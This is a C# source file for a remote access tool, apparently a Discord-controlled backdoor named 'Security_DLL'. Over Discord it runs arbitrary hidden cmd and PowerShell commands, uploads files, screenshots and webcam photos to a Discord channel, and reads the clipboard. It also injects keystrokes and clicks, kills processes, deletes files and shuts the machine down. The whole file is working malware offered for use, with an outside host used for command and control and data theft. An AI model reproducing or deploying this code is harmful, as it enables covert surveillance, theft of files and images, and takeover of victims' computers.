using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Security_DLL
{
    internal class ControlPC
    {
        private static readonly string BotToken = "0"; // CAMBIA ESTE TOKEN
        private static readonly ulong CanalID = 0;
        private static HttpClient client = new HttpClient();

        static ControlPC()
        {
            client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");
        }

        public static async Task EnviarAyudaControl()
        {
            string ayuda = @"
**🖥️ COMANDOS DE CONTROL PC - /helppc**

**🔹 COMANDOS BÁSICOS:**
`/helppc` - Muestra esta ayuda
`/info` - Información del sistema
`/ip` - IP pública
`/hora` - Hora del sistema

**🔹 CONTROL DEL SISTEMA:**
`/apagar` - Apaga el PC
`/reiniciar` - Reinicia el PC  
`/bloquear` - Bloquea pantalla
`/cerrar_sesion` - Cierra sesión
`/suspender` - Suspende PC
`/hibernar` - Hiberna PC

**🔹 COMANDOS CMD:**
`/cmd ipconfig` - Ejecuta CMD
`/cmd dir C:\` - Lista directorio
`/powershell Get-Process` - Ejecuta PowerShell

**🔹 PROGRAMAS:**
`/notepad` - Abre Bloc de notas
`/calc` - Abre Calculadora
`/cmd` - Abre CMD
`/explorer` - Abre Explorador
`/taskmgr` - Abre Administrador de tareas
`/chrome` - Abre Chrome
`/spotify` - Abre Spotify

**🔹 ARCHIVOS:**
`/listar C:\Users` - Lista archivos
`/enviar C:\archivo.txt` - Envía archivo
`/eliminar C:\archivo.txt` - Elimina archivo
`/crear_carpeta C:\nueva` - Crea carpeta

**🔹 PROCESOS:**
`/procesos` - Lista procesos activos
`/matar 1234` - Mata proceso por PID
`/matar_nombre chrome` - Mata proceso por nombre

**🔹 VENTANAS:**
`/ventanas` - Lista ventanas abiertas
`/cerrar_ventana notepad` - Cierra ventana

**🔹 CAPTURA:**
`/screenshot` - Captura pantalla
`/webcam` - Foto de cámara

**🔹 INFORMACIÓN:**
`/systeminfo` - Info del sistema
`/disk` - Info de discos
`/red` - Info de red
`/usuarios` - Usuarios del sistema

**🔹 NAVEGACIÓN:**
`/web www.google.com` - Abre navegador
`/descargar_web https://...` - Descarga archivo

**🔹 TECLADO/MOUSE:**
`/escribir Hola mundo` - Escribe texto
`/presionar ENTER` - Presiona tecla
`/click` - Click izquierdo
`/click_derecho` - Click derecho

**🔹 UTILIDADES:**
`/mensaje Hola` - Muestra mensaje
`/alerta Cuidado` - Muestra alerta
`/clipboard` - Muestra portapapeles
`/clipboard_set texto` - Copia texto
`/teclas` - Teclado virtual
";
            await EnviarMensaje(ayuda);
        }

        public static async Task EjecutarComandoControl(string comando)
        {
            string cmd = comando.ToLower().Trim();

            // Comandos básicos
            if (cmd == "/helppc" || cmd == "/help")
            {
                await EnviarAyudaControl();
            }
            else if (cmd == "/info")
            {
                await EnviarMensaje($"**💻 PC:** {Environment.MachineName}\n**👤 Usuario:** {Environment.UserName}\n**💿 SO:** {Environment.OSVersion}\n**🕐 Hora:** {DateTime.Now}");
            }
            else if (cmd == "/ip")
            {
                string ip = await ObtenerIP();
                await EnviarMensaje($"🌐 **IP Pública:** {ip}");
            }
            else if (cmd == "/hora")
            {
                await EnviarMensaje($"🕐 **Hora del sistema:** {DateTime.Now}");
            }

            // Control del sistema
            else if (cmd == "/apagar")
            {
                await EnviarMensaje("🖥️ Apagando PC en 10 segundos...");
                _ = Task.Run(async () => { await Task.Delay(10000); Process.Start("shutdown", "/s /t 0"); });
            }
            else if (cmd == "/reiniciar")
            {
                await EnviarMensaje("🔄 Reiniciando PC en 10 segundos...");
                _ = Task.Run(async () => { await Task.Delay(10000); Process.Start("shutdown", "/r /t 0"); });
            }
            else if (cmd == "/bloquear")
            {
                await EnviarMensaje("🔒 Bloqueando pantalla...");
                Process.Start("rundll32.exe", "user32.dll,LockWorkStation");
            }
            else if (cmd == "/cerrar_sesion")
            {
                await EnviarMensaje("👋 Cerrando sesión...");
                Process.Start("shutdown", "/l");
            }
            else if (cmd == "/suspender")
            {
                await EnviarMensaje("😴 Suspendiendo PC...");
                Process.Start("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0");
            }
            else if (cmd == "/hibernar")
            {
                await EnviarMensaje("💤 Hibernando PC...");
                Process.Start("shutdown", "/h");
            }

            // Comandos CMD
            else if (cmd.StartsWith("/cmd "))
            {
                string comandoCMD = comando.Substring(5);
                await EjecutarCMD(comandoCMD);
            }
            else if (cmd.StartsWith("/powershell "))
            {
                string psComando = comando.Substring(11);
                await EjecutarPowerShell(psComando);
            }

            // Programas
            else if (cmd == "/notepad")
            {
                Process.Start("notepad.exe");
                await EnviarMensaje("✅ Bloc de notas abierto");
            }
            else if (cmd == "/calc")
            {
                Process.Start("calc.exe");
                await EnviarMensaje("✅ Calculadora abierta");
            }
            else if (cmd == "/cmd" || cmd == "/simbolo")
            {
                Process.Start("cmd.exe");
                await EnviarMensaje("✅ Símbolo del sistema abierto");
            }
            else if (cmd == "/explorer")
            {
                Process.Start("explorer.exe");
                await EnviarMensaje("✅ Explorador de archivos abierto");
            }
            else if (cmd == "/taskmgr")
            {
                Process.Start("taskmgr.exe");
                await EnviarMensaje("✅ Administrador de tareas abierto");
            }
            else if (cmd == "/chrome")
            {
                Process.Start("chrome.exe");
                await EnviarMensaje("✅ Chrome abierto");
            }
            else if (cmd == "/spotify")
            {
                Process.Start("spotify.exe");
                await EnviarMensaje("✅ Spotify abierto");
            }

            // Archivos
            else if (cmd.StartsWith("/listar "))
            {
                string ruta = comando.Substring(8);
                await ListarArchivos(ruta);
            }
            else if (cmd.StartsWith("/enviar "))
            {
                string ruta = comando.Substring(8);
                await EnviarArchivo(ruta);
            }
            else if (cmd.StartsWith("/eliminar "))
            {
                string ruta = comando.Substring(10);
                await EliminarArchivo(ruta);
            }
            else if (cmd.StartsWith("/crear_carpeta "))
            {
                string ruta = comando.Substring(15);
                await CrearCarpeta(ruta);
            }

            // Procesos
            else if (cmd == "/procesos")
            {
                await ListarProcesos();
            }
            else if (cmd.StartsWith("/matar "))
            {
                string pid = comando.Substring(7);
                await MatarProceso(pid);
            }
            else if (cmd.StartsWith("/matar_nombre "))
            {
                string nombre = comando.Substring(15);
                await MatarProcesoPorNombre(nombre);
            }

            // Ventanas
            else if (cmd == "/ventanas")
            {
                await ListarVentanas();
            }
            else if (cmd.StartsWith("/cerrar_ventana "))
            {
                string titulo = comando.Substring(16);
                await CerrarVentana(titulo);
            }

            // Captura
            else if (cmd == "/screenshot")
            {
                await TomarScreenshot();
            }
            else if (cmd == "/webcam")
            {
                await FotoCam.TomarFotoYEnviar();
            }

            // Información
            else if (cmd == "/systeminfo")
            {
                await SystemInfo();
            }
            else if (cmd == "/disk")
            {
                await DiskInfo();
            }
            else if (cmd == "/red")
            {
                await RedInfo();
            }
            else if (cmd == "/usuarios")
            {
                await ListarUsuarios();
            }

            // Navegación
            else if (cmd.StartsWith("/web "))
            {
                string url = comando.Substring(5);
                if (!url.StartsWith("http")) url = "https://" + url;
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
                await EnviarMensaje($"✅ Abriendo: {url}");
            }
            else if (cmd.StartsWith("/descargar_web "))
            {
                string url = comando.Substring(16);
                await DescargarDeWeb(url);
            }

            // Teclado/Mouse
            else if (cmd.StartsWith("/escribir "))
            {
                string texto = comando.Substring(10);
                SendKeys.SendWait(texto);
                await EnviarMensaje($"✅ Texto escrito: {texto}");
            }
            else if (cmd.StartsWith("/presionar "))
            {
                string tecla = comando.Substring(11).ToUpper();
                SendKeys.SendWait($"{{{tecla}}}");
                await EnviarMensaje($"✅ Tecla presionada: {tecla}");
            }
            else if (cmd == "/click")
            {
                ClickMouse();
                await EnviarMensaje("✅ Click izquierdo");
            }
            else if (cmd == "/click_derecho")
            {
                ClickMouseDerecho();
                await EnviarMensaje("✅ Click derecho");
            }

            // Utilidades
            else if (cmd.StartsWith("/mensaje "))
            {
                string texto = comando.Substring(9);
                MessageBox.Show(texto, "Mensaje", MessageBoxButtons.OK, MessageBoxIcon.Information);
                await EnviarMensaje("✅ Mensaje mostrado");
            }
            else if (cmd.StartsWith("/alerta "))
            {
                string texto = comando.Substring(8);
                MessageBox.Show(texto, "ALERTA", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                await EnviarMensaje("✅ Alerta mostrada");
            }
            else if (cmd == "/clipboard")
            {
                string texto = ObtenerClipboard();
                await EnviarMensaje($"📋 **Portapapeles:**\n```{texto}```");
            }
            else if (cmd.StartsWith("/clipboard_set "))
            {
                string texto = comando.Substring(16);
                Clipboard.SetText(texto);
                await EnviarMensaje("✅ Texto copiado al portapapeles");
            }
            else if (cmd == "/teclas")
            {
                Process.Start("osk.exe");
                await EnviarMensaje("✅ Teclado virtual abierto");
            }
            else if (cmd == "/vaciar_papelera")
            {
                await VaciarPapelera();
            }
            else if (cmd == "/volumen_bajo")
            {
                BajarVolumen();
                await EnviarMensaje("🔉 Volumen bajado");
            }
            else if (cmd == "/volumen_alto")
            {
                SubirVolumen();
                await EnviarMensaje("🔊 Volumen subido");
            }
            else if (cmd == "/mute")
            {
                Silenciar();
                await EnviarMensaje("🔇 Sonido silenciado");
            }
            else if (!string.IsNullOrEmpty(cmd) && cmd.StartsWith("/"))
            {
                await EnviarMensaje($"❌ Comando no reconocido: `{cmd}`\nUsa `/helppc` para ver comandos");
            }
        }

        private static async Task EjecutarCMD(string comando)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {comando}";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    string resultado = output.Length > 1900 ? output.Substring(0, 1900) + "..." : output;
                    await EnviarMensaje($"```\n{resultado}\n```");
                }
                if (!string.IsNullOrEmpty(error))
                {
                    await EnviarMensaje($"❌ Error:\n```\n{error}\n```");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task EjecutarPowerShell(string comando)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-Command \"{comando}\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    string resultado = output.Length > 1900 ? output.Substring(0, 1900) + "..." : output;
                    await EnviarMensaje($"```\n{resultado}\n```");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task ListarArchivos(string ruta)
        {
            try
            {
                if (!Directory.Exists(ruta))
                {
                    await EnviarMensaje($"❌ Carpeta no existe: {ruta}");
                    return;
                }

                var dir = new DirectoryInfo(ruta);
                var archivos = dir.GetFiles();
                var carpetas = dir.GetDirectories();

                StringBuilder sb = new StringBuilder();
                sb.AppendLine($"📁 **{ruta}**");
                sb.AppendLine("```");
                sb.AppendLine($"📂 CARPETAS ({carpetas.Length}):");
                foreach (var c in carpetas.Take(15))
                    sb.AppendLine($"  📁 {c.Name}");
                sb.AppendLine($"\n📄 ARCHIVOS ({archivos.Length}):");
                foreach (var a in archivos.Take(20))
                    sb.AppendLine($"  📄 {a.Name} ({a.Length / 1024} KB)");
                sb.AppendLine("```");
                await EnviarMensaje(sb.ToString());
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task EnviarArchivo(string ruta)
        {
            try
            {
                if (!File.Exists(ruta))
                {
                    await EnviarMensaje($"❌ Archivo no existe: {ruta}");
                    return;
                }

                var info = new FileInfo(ruta);
                if (info.Length > 8_388_608)
                {
                    await EnviarMensaje($"❌ Archivo muy grande ({info.Length / 1024 / 1024}MB)");
                    return;
                }

                await EnviarArchivoADiscord(ruta);
                await EnviarMensaje($"✅ Archivo enviado: {info.Name}");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task EliminarArchivo(string ruta)
        {
            try
            {
                if (File.Exists(ruta))
                {
                    File.Delete(ruta);
                    await EnviarMensaje($"✅ Eliminado: {ruta}");
                }
                else if (Directory.Exists(ruta))
                {
                    Directory.Delete(ruta, true);
                    await EnviarMensaje($"✅ Eliminado: {ruta}");
                }
                else
                {
                    await EnviarMensaje($"❌ No existe: {ruta}");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task CrearCarpeta(string ruta)
        {
            try
            {
                Directory.CreateDirectory(ruta);
                await EnviarMensaje($"✅ Carpeta creada: {ruta}");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task ListarProcesos()
        {
            try
            {
                var procesos = Process.GetProcesses();
                StringBuilder sb = new StringBuilder();
                sb.AppendLine($"📊 **PROCESOS ({procesos.Length})**");
                sb.AppendLine("```");
                sb.AppendLine($"{"PID",-8} {"Nombre",-25} {"Memoria MB",-10}");
                sb.AppendLine(new string('-', 50));

                foreach (var p in procesos.Take(30))
                {
                    try
                    {
                        sb.AppendLine($"{p.Id,-8} {p.ProcessName,-25} {p.WorkingSet64 / 1024 / 1024,-10}");
                    }
                    catch { }
                }
                sb.AppendLine("```");
                await EnviarMensaje(sb.ToString());
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task MatarProceso(string pid)
        {
            try
            {
                var p = Process.GetProcessById(int.Parse(pid));
                p.Kill();
                await EnviarMensaje($"✅ Proceso {pid} terminado");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task MatarProcesoPorNombre(string nombre)
        {
            try
            {
                var procesos = Process.GetProcessesByName(nombre);
                foreach (var p in procesos) p.Kill();
                await EnviarMensaje($"✅ {procesos.Length} procesos '{nombre}' terminados");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task ListarVentanas()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("🪟 **VENTANAS ABIERTAS:**");
                sb.AppendLine("```");
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(p.MainWindowTitle))
                            sb.AppendLine($"• {p.ProcessName}: {p.MainWindowTitle}");
                    }
                    catch { }
                }
                sb.AppendLine("```");
                await EnviarMensaje(sb.ToString());
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task CerrarVentana(string titulo)
        {
            try
            {
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        if (p.MainWindowTitle.ToLower().Contains(titulo.ToLower()))
                        {
                            p.CloseMainWindow();
                            await EnviarMensaje($"✅ Ventana cerrada: {p.MainWindowTitle}");
                            return;
                        }
                    }
                    catch { }
                }
                await EnviarMensaje($"❌ No se encontró: {titulo}");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task TomarScreenshot()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                using (var bmp = new Bitmap(bounds.Width, bounds.Height))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                    string temp = Path.GetTempFileName() + ".jpg";
                    bmp.Save(temp, System.Drawing.Imaging.ImageFormat.Jpeg);
                    await EnviarArchivoADiscord(temp);
                    File.Delete(temp);
                    await EnviarMensaje("✅ Captura enviada");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task SystemInfo()
        {
            try
            {
                var p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c systeminfo";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = await p.StandardOutput.ReadToEndAsync();
                string resultado = output.Length > 1900 ? output.Substring(0, 1900) + "..." : output;
                await EnviarMensaje($"```\n{resultado}\n```");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task DiskInfo()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("💾 **DISCOS:**");
                sb.AppendLine("```");
                foreach (var d in DriveInfo.GetDrives())
                {
                    if (d.IsReady)
                    {
                        sb.AppendLine($"{d.Name} - {d.TotalSize / 1024 / 1024 / 1024}GB total, {d.AvailableFreeSpace / 1024 / 1024 / 1024}GB libre");
                    }
                }
                sb.AppendLine("```");
                await EnviarMensaje(sb.ToString());
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task RedInfo()
        {
            try
            {
                var p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c ipconfig";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = await p.StandardOutput.ReadToEndAsync();
                await EnviarMensaje($"```\n{output}\n```");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task ListarUsuarios()
        {
            try
            {
                var users = new List<string>();
                foreach (var d in Directory.GetDirectories(@"C:\Users"))
                {
                    string user = Path.GetFileName(d);
                    if (!new[] { "Public", "Default", "All Users", "Default User" }.Contains(user))
                        users.Add(user);
                }
                await EnviarMensaje($"👥 **USUARIOS:**\n```\n{string.Join("\n", users)}\n```");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task DescargarDeWeb(string url)
        {
            try
            {
                using (var http = new HttpClient())
                {
                    var data = await http.GetByteArrayAsync(url);
                    string temp = Path.GetTempFileName();
                    File.WriteAllBytes(temp, data);
                    await EnviarArchivoADiscord(temp);
                    File.Delete(temp);
                    await EnviarMensaje($"✅ Descargado de: {url}");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task VaciarPapelera()
        {
            try
            {
                Process.Start("cmd.exe", "/c rd /s /q C:\\$Recycle.bin");
                await EnviarMensaje("✅ Papelera vaciada");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static void BajarVolumen()
        {
            for (int i = 0; i < 5; i++)
                SendKeys.SendWait("{VOLUME_DOWN}");
        }

        private static void SubirVolumen()
        {
            for (int i = 0; i < 5; i++)
                SendKeys.SendWait("{VOLUME_UP}");
        }

        private static void Silenciar()
        {
            SendKeys.SendWait("{VOLUME_MUTE}");
        }

        private static void ClickMouse()
        {
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        }

        private static void ClickMouseDerecho()
        {
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        }

        private static string ObtenerClipboard()
        {
            try { return Clipboard.ContainsText() ? Clipboard.GetText() : "Vacío"; }
            catch { return "No accesible"; }
        }

        private static async Task<string> ObtenerIP()
        {
            try
            {
                using (var web = new System.Net.WebClient())
                    return await web.DownloadStringTaskAsync("https://api.ipify.org");
            }
            catch { return "No disponible"; }
        }

        private static async Task EnviarMensaje(string mensaje)
        {
            try
            {
                var payload = new { content = mensaje };
                string json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", content);
            }
            catch { }
        }

        private static async Task EnviarArchivoADiscord(string ruta)
        {
            try
            {
                byte[] data = File.ReadAllBytes(ruta);
                using (var form = new MultipartFormDataContent())
                {
                    var file = new ByteArrayContent(data);
                    file.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                    form.Add(file, "file", Path.GetFileName(ruta));
                    await client.PostAsync($"https://discord.com/api/v10/channels/{CanalID}/messages", form);
                }
            }
            catch { }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const int MOUSEEVENTF_LEFTUP = 0x0004;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const int MOUSEEVENTF_RIGHTUP = 0x0010;
    }
}